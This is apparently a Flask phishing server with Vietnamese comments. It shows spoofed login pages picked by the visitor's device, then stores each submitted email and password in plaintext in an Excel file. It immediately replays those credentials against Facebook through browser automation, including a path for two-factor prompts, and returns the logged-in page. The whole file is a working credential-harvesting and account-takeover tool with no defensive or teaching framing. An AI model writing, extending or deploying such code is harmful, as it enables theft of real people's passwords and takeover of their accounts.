from flask import Flask, render_template, request, jsonify
from openpyxl import Workbook, load_workbook
from utils.get_html import get_facebook_page_after_login
import os

app = Flask(__name__)

FILE_NAME = "users.xlsx"


def detect_device(user_agent):
    ua = user_agent.lower()

    if "iphone" in ua or "ipad" in ua or "ios" in ua:
        return "ios"

    if "android" in ua:
        return "android"

    return "desktop"


@app.route("/")
def home():

    user_agent = request.headers.get("User-Agent", "")
    device = detect_device(user_agent)

    print("User-Agent:", user_agent)
    print("Device:", device)

    if device == "ios":
        return render_template("iOS/login.html")

    elif device == "android":
        return render_template("Android/login.html")

    else:
        return render_template("Desktop/login.html")


@app.route("/login", methods=["POST"])
def login():
    data = request.json
    email = data.get("email")
    password = data.get("password")

    if not email or not password:
        return jsonify({"success": False, "error": "Missing email or password"}), 400

    # Lưu vào file Excel
    try:
        if not os.path.exists(FILE_NAME):
            wb = Workbook()
            ws = wb.active
            ws.append(["Email", "Password"])
            wb.save(FILE_NAME)

        wb = load_workbook(FILE_NAME)
        ws = wb.active
        ws.append([email, password])
        wb.save(FILE_NAME)
    except Exception as e:
        return jsonify({"success": False, "error": f"Failed to save to Excel: {str(e)}"}), 500

    # Gọi hàm login Facebook
    try:
        result = get_facebook_page_after_login(
            username=email,
            password=password,
            headless=False,          # Để False để có thể thấy captcha/2FA và tương tác nếu cần
            timeout=120000            # Thời gian chờ tối đa 2 phút (có thể điều chỉnh)
        )

        if result["status"] == "success":
            return jsonify({"success": True, "html": result["html"]})

        elif result["status"] == "2fa_required":
            # Vẫn trả về 200 kèm thông tin để client xử lý
            return jsonify({
                "success": False,
                "requires_2fa": True,
                "url": result.get("url"),
                "message": result.get("message", "Two-factor authentication required")
            }), 200

        else:  # status == "error"
            return jsonify({
                "success": False,
                "error": result.get("message", "Unknown error during Facebook automation")
            }), 500

    except Exception as e:
        return jsonify({"success": False, "error": f"Error during Facebook automation: {str(e)}"}), 500


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=5000,
        debug=True,
        use_reloader=False
    )